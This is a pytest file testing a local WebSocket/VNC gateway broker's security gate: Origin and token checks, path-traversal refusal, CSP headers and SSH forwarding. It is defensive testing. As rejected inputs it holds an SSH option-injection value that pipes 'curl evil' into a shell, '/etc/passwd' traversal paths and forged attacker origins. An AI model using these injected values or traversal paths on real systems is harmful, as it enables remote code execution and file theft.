"""The Track B laptop gateway broker (plugins/browser/commands/gateway.py).

Covers the pure request-gating helpers AND a real-socket integration test of the
broker: it is the ONLY browser-reachable listener, so its Origin/Host (CSWSH) +
token gate and its static-file CSP headers are the trust boundary. websockify is
stubbed by a fake unix-socket echo upstream — the broker must splice raw bytes to
it only after the gate passes."""
from __future__ import annotations

import importlib.util
import socket
import sys
import threading
import time
import types
from pathlib import Path

import pytest

_GW = Path(__file__).resolve().parents[2] / "plugins/browser/commands/gateway.py"
_spec = importlib.util.spec_from_file_location("browser_gateway", _GW)
gw = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(gw)  # type: ignore[union-attr]

_WEB = Path(__file__).resolve().parents[2] / "plugins/browser/gateway_web"


# ───────────────────────── pure helpers ─────────────────────────
def test_parse_request_head_basic():
    raw = b"GET /vnc.html?x=1 HTTP/1.1\r\nHost: 127.0.0.1:9\r\nOrigin: http://a\r\n\r\n"
    method, target, headers = gw.parse_request_head(raw)
    assert method == "GET" and target == "/vnc.html?x=1"
    assert headers["host"] == "127.0.0.1:9" and headers["origin"] == "http://a"


def test_parse_request_head_malformed():
    assert gw.parse_request_head(b"\r\n\r\n") is None
    assert gw.parse_request_head(b"GARBAGE\r\n\r\n") is None


@pytest.mark.parametrize("host,origin,ok", [
    ("127.0.0.1:6080", "http://127.0.0.1:6080", True),
    ("127.0.0.1:6080", "http://evil.example", False),   # CSWSH: wrong origin
    ("evil.example:6080", "http://127.0.0.1:6080", False),  # rebind: wrong host
    ("127.0.0.1:6080", None, False),                    # ws always sends Origin
    ("127.0.0.1:6080", "http://127.0.0.1:9999", False),  # wrong port
])
def test_origin_ok(host, origin, ok):
    headers = {"host": host}
    if origin is not None:
        headers["origin"] = origin
    assert gw.origin_ok(headers, "127.0.0.1:6080") is ok


def test_token_ok():
    assert gw.token_ok("/websockify?token=SECRET", "SECRET") is True
    assert gw.token_ok("/websockify?token=WRONG", "SECRET") is False
    assert gw.token_ok("/websockify", "SECRET") is False
    assert gw.token_ok("/websockify?token=SECRET", "") is False


def test_resolve_static_default_and_known():
    full, ctype = gw.resolve_static("/", _WEB)
    assert full.name == "vnc.html" and ctype.startswith("text/html")
    full, ctype = gw.resolve_static("/app.js", _WEB)
    assert full.name == "app.js" and "javascript" in ctype
    full, _ = gw.resolve_static("/novnc/core/rfb.js", _WEB)
    assert full.name == "rfb.js"


def test_resolve_static_refuses_traversal_and_unknown():
    assert gw.resolve_static("/../../etc/passwd", _WEB) is None
    assert gw.resolve_static("/../commands/gateway.py", _WEB) is None  # .py not in MIME
    assert gw.resolve_static("/nope.js", _WEB) is None                 # missing


@pytest.mark.parametrize("node", ["-oProxyCommand=curl evil|sh", "-Jx", "--"])
def test_resolve_rfb_target_refuses_dash_leading_node(node):
    """SSH option-injection guard (review HIGH): a node/socket/login starting
    with '-' would become an ssh OPTION (laptop RCE) — must fail closed."""
    handle = {"transport": "unix", "node": node, "rfb_sock": "/run/viewer/vnc.sock"}
    cleanup = []
    assert gw._resolve_rfb_target(handle, {}, None, cleanup) is None
    assert cleanup == []                               # never spawned ssh


def test_resolve_rfb_target_refuses_dash_leading_socket():
    handle = {"transport": "unix", "node": "node042", "rfb_sock": "-oProxyCommand=x"}
    assert gw._resolve_rfb_target(handle, {}, None, []) is None


def test_resolve_rfb_target_hpc_builds_ssh_forward(monkeypatch):
    """HPC/apptainer path: forwards the node-local 0700 RFB socket over
    `ssh -N -o ExitOnForwardFailure=yes -L <localport>:<sock> [-J <login>] <node>`
    then targets 127.0.0.1:<localport>. Stub the actual ssh + port probe so the
    argv is asserted without a cluster."""
    spawned = {}

    class _FakePopen:
        def __init__(self, argv):
            spawned["argv"] = argv
        def terminate(self):
            pass
    monkeypatch.setattr(gw.subprocess, "Popen", _FakePopen)
    monkeypatch.setattr(gw, "_free_loopback_port", lambda: 5951)
    monkeypatch.setattr(gw, "_wait_for", lambda pred, timeout, interval=0.1: True)

    handle = {"transport": "unix", "node": "c04n07",
              "rfb_sock": "/run/state/sessions/x/viewer/vnc.sock",
              "node_provisional": True}
    cleanup = []
    target = gw._resolve_rfb_target(handle, {}, "grace-login", cleanup)
    assert target == "127.0.0.1:5951"
    argv = spawned["argv"]
    assert argv[0] == "ssh" and "-N" in argv
    assert "ExitOnForwardFailure=yes" in argv
    assert "-L" in argv and "5951:/run/state/sessions/x/viewer/vnc.sock" in argv
    assert argv[argv.index("-J") + 1] == "grace-login"     # jump host
    assert argv[-1] == "c04n07"                             # node is the positional
    assert cleanup                                          # ssh registered for teardown


def test_docker_host_rfb_port_survives_malformed_container_port():
    spec = {"port_forwards": [
        {"label": "x", "container_port": "not-an-int", "host_port": 1},
        {"label": "browser viewer (RFB)", "container_port": 5900, "host_port": 42},
    ]}
    assert gw.docker_host_rfb_port(spec) == 42          # no ValueError escapes


def test_docker_host_rfb_port_by_label_and_port():
    spec = {"port_forwards": [
        {"label": "web", "container_port": 8501, "host_port": 9000},
        {"label": "browser viewer (RFB)", "container_port": 5900, "host_port": 55123},
    ]}
    assert gw.docker_host_rfb_port(spec) == 55123
    # falls back to container_port 5900 when the label differs
    spec2 = {"port_forwards": [{"label": "x", "container_port": 5900, "host_port": 7}]}
    assert gw.docker_host_rfb_port(spec2) == 7
    assert gw.docker_host_rfb_port({"port_forwards": []}) is None


def test_gateway_fails_upfront_when_websockify_missing(monkeypatch, capsys):
    """A gateway-mode session with websockify absent must fail FAST and clean —
    before spawning ssh/sockets — with the botainer[gateway] install hint, not a
    leaked traceback after a timeout."""
    class _Rec:
        extra_runtime_handle = {"browser_viewer": {"mode": "gateway",
                                                   "transport": "tcp"}}
        spec = {}
    fake_watch = types.ModuleType("watch")
    fake_watch._load_running_viewer_record = lambda: _Rec()
    fake_watch._viewer_handle = lambda r: r.extra_runtime_handle["browser_viewer"]
    monkeypatch.setitem(sys.modules, "watch", fake_watch)
    monkeypatch.setattr(gw, "websockify_available", lambda: False)
    # If the upfront check works, nothing below it runs — make sure it never
    # reaches the ssh/subprocess layer.
    monkeypatch.setattr(gw.subprocess, "Popen",
                        lambda *a, **k: pytest.fail("spawned before dep check"))
    rc = gw.main([])
    assert rc == 3
    err = capsys.readouterr().err
    assert "botainer[gateway]" in err and "websockify" in err


def test_websockify_available_logic(monkeypatch):
    # Deterministic (not env-dependent): PATH script OR importable module → True.
    monkeypatch.setattr(gw.shutil, "which", lambda n: "/usr/bin/websockify")
    monkeypatch.setattr(gw.importlib.util, "find_spec", lambda n: None)
    assert gw.websockify_available() is True
    monkeypatch.setattr(gw.shutil, "which", lambda n: None)
    monkeypatch.setattr(gw.importlib.util, "find_spec", lambda n: object())
    assert gw.websockify_available() is True
    monkeypatch.setattr(gw.importlib.util, "find_spec", lambda n: None)
    assert gw.websockify_available() is False           # neither → fail closed


def test_websockify_cmd_omits_web_when_none():
    cmd = gw.websockify_cmd(None, "/run/gw.sock", "127.0.0.1:5900")
    assert "--web" not in cmd
    assert "--unix-listen=/run/gw.sock" in cmd and "127.0.0.1:5900" in cmd
    assert "--token-plugin" not in cmd


def test_throwaway_browser_cmd_exe_override():
    cmd = gw.throwaway_browser_cmd("http://x", "/tmp/p", "chrome",
                                   exe="/Applications/Google Chrome.app/x")
    assert cmd[0] == "/Applications/Google Chrome.app/x"
    assert "--user-data-dir=/tmp/p" in cmd and cmd[-1] == "http://x"


# ───────────────────────── broker integration ─────────────────────────
class _FakeUpstream(threading.Thread):
    """A unix-socket echo server standing in for websockify: records the first
    bytes it receives (the replayed HTTP head) and echoes everything back."""

    def __init__(self, sock_path: str):
        super().__init__(daemon=True)
        self.sock_path = sock_path
        self.received = b""
        self._srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self._srv.bind(sock_path)
        self._srv.listen(4)
        self._stop = False

    def run(self):
        self._srv.settimeout(0.3)
        while not self._stop:
            try:
                c, _ = self._srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            data = c.recv(65536)
            self.received += data
            with __import__("contextlib").suppress(OSError):
                c.sendall(b"UPSTREAM-ECHO:" + data)
            c.close()

    def stop(self):
        self._stop = True
        with __import__("contextlib").suppress(OSError):
            self._srv.close()


@pytest.fixture()
def broker():
    # A SHORT socket dir: macOS caps sockaddr_un.sun_path at 104 bytes, and the
    # pytest tmp_path blows past it. mkdtemp under the system tmp is short.
    import shutil
    import tempfile
    sock_dir = tempfile.mkdtemp(prefix="gwt-")
    ws_sock = str(Path(sock_dir) / "ws.sock")
    upstream = _FakeUpstream(ws_sock)
    upstream.start()
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(16)
    port = srv.getsockname()[1]
    b = gw._Broker(srv, _WEB, "GOODTOKEN", ws_sock, gw.strict_csp(port))
    b.start()
    time.sleep(0.05)
    yield b, port, upstream
    b.stop()
    upstream.stop()
    shutil.rmtree(sock_dir, ignore_errors=True)


def _raw_request(port: int, lines: list[str]) -> bytes:
    c = socket.create_connection(("127.0.0.1", port), timeout=3)
    c.sendall(("\r\n".join(lines) + "\r\n\r\n").encode())
    time.sleep(0.15)
    c.settimeout(2)
    out = b""
    try:
        while True:
            chunk = c.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    c.close()
    return out


def test_broker_serves_page_with_strict_csp(broker):
    _b, port, _up = broker
    resp = _raw_request(port, ["GET /vnc.html HTTP/1.1", f"Host: 127.0.0.1:{port}"])
    assert b"200 OK" in resp
    assert b"Content-Security-Policy: default-src 'none'" in resp
    assert b"X-Content-Type-Options: nosniff" in resp
    assert b"Referrer-Policy: no-referrer" in resp
    assert b"<title>botainer" in resp                 # the vendored minimal page


def test_broker_serves_module_js(broker):
    _b, port, _up = broker
    resp = _raw_request(port, ["GET /novnc/core/rfb.js HTTP/1.1",
                               f"Host: 127.0.0.1:{port}"])
    assert b"200 OK" in resp and b"text/javascript" in resp


def test_broker_404_on_traversal(broker):
    _b, port, _up = broker
    resp = _raw_request(port, ["GET /../commands/gateway.py HTTP/1.1",
                               f"Host: 127.0.0.1:{port}"])
    assert b"404" in resp and b"gateway" not in resp.split(b"\r\n\r\n", 1)[-1]


def test_broker_ws_rejected_wrong_origin_CSWSH(broker):
    """A drive-by page (correct token in URL, WRONG Origin) must NOT reach the
    upstream — this is the CSWSH kill."""
    _b, port, up = broker
    resp = _raw_request(port, [
        "GET /websockify?token=GOODTOKEN HTTP/1.1",
        f"Host: 127.0.0.1:{port}",
        "Upgrade: websocket",
        "Origin: http://evil.example",
    ])
    assert b"403" in resp
    assert up.received == b""                          # never spliced upstream


def test_broker_ws_rejected_wrong_token(broker):
    _b, port, up = broker
    resp = _raw_request(port, [
        "GET /websockify?token=WRONG HTTP/1.1",
        f"Host: 127.0.0.1:{port}",
        "Upgrade: websocket",
        f"Origin: http://127.0.0.1:{port}",
    ])
    assert b"403" in resp
    assert up.received == b""


def test_broker_ws_good_gate_splices_to_upstream(broker):
    """Correct Host+Origin+token → the broker splices the raw head (and echoes
    upstream bytes back), proving the byte-bridge only opens behind the gate."""
    _b, port, up = broker
    resp = _raw_request(port, [
        "GET /websockify?token=GOODTOKEN HTTP/1.1",
        f"Host: 127.0.0.1:{port}",
        "Upgrade: websocket",
        f"Origin: http://127.0.0.1:{port}",
    ])
    assert resp.startswith(b"UPSTREAM-ECHO:")          # spliced through
    assert b"/websockify?token=GOODTOKEN" in up.received  # head replayed upstream
    assert b"Origin: http://127.0.0.1" in up.received


def test_websockify_launch_prefers_botainers_own_interpreter(monkeypatch):
    """The `gateway` extra pins websockify into botainer's OWN environment.

    Resolving a bare-name `websockify` off PATH first (the previous order) ran
    whichever copy PATH happened to name — not the pinned one this project
    tests, and not necessarily ours. websockify sits on the gateway's data path
    between the user's browser and the VNC endpoint, so 'which copy' is not a
    cosmetic question.
    """
    base = gw.websockify_cmd(None, "/run/gw.sock", "127.0.0.1:5900")
    assert base[0] == "websockify"

    # module importable → our interpreter wins, even with a PATH copy present
    monkeypatch.setattr(gw.importlib.util, "find_spec", lambda n: object())
    monkeypatch.setattr(gw.shutil, "which", lambda n: "/usr/local/bin/websockify")
    argv = gw.websockify_launch_argv(base)
    assert argv[:3] == [sys.executable, "-m", "websockify"]
    assert argv[3:] == base[1:]            # every websockify flag survives

    # not importable → fall back to the console script, unchanged
    monkeypatch.setattr(gw.importlib.util, "find_spec", lambda n: None)
    assert gw.websockify_launch_argv(base) == base
